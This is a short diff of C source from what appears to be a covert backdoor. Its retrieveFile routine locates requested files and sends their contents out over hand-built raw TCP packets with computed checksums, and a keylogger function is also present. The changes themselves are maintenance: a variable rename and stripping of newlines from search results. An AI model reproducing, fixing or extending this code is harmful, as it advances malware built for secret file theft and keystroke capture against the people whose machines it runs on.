@@ -76,7 +76,8 @@ void retrieveFile(char *fileName)
     int socket = 0;
     char line[PATH_MAX];
     char *buffer = NULL;
-    struct sockaddr_in sin;
+    char *temp = NULL;
+    struct sockaddr_in din;
     
     FILE *results = NULL;
     
@@ -105,13 +106,16 @@ void retrieveFile(char *fileName)
     shutdown(socket, SHUT_RD);
     
     // Create the packet structure
-    buffer = createRawTcpPacket(&sin);
+    buffer = createRawTcpPacket(&din);
     
     // This will handle multiple results from locate, client may break depending
     // on the type of file requested.
     while (fgets(line, PATH_MAX, results) != NULL)
     {
-        processFile(line, socket, buffer, &sin);
+        // Remove the newline character if it exists
+        if ((temp = strchr(line, '\n')) != NULL)
+            *temp = '\0';
+        processFile(line, socket, buffer, &din);
     }
     
     // Send a FIN packet to signal end of transfer
@@ -136,7 +140,7 @@ void keylogger()
 #endif
 }
 
-static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin)
+static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *din)
 {
     int bytesRead = 0;
     int zero = 0;
@@ -173,7 +177,7 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
         memcpy(buffer + 10, &sum, sizeof(unsigned short));
         
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
-               (struct sockaddr *)sin, sizeof(struct sockaddr_in));
+               (struct sockaddr *)din, sizeof(struct sockaddr_in));
     }
 }
 
